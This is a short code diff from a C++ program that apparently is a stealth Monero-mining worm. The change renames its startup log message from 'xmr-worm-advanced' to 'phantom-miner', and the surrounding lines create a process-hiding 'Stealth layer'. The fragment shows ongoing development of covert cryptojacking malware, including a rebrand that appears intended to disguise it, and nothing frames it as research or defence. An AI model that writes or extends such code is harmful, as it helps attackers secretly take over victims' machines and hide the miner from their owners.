@@ -104,7 +104,7 @@ int main(int /*argc*/, char * /*argv*/[]) {
         }
 
         XMR::Logger::init(config.advanced.log_file);
-        XMR::Logger::info("xmr-worm-advanced starting up.");
+        XMR::Logger::info("phantom-miner starting up.");
 
         // Stealth layer
         g_hider = std::make_unique<Stealth::ProcessHider>();
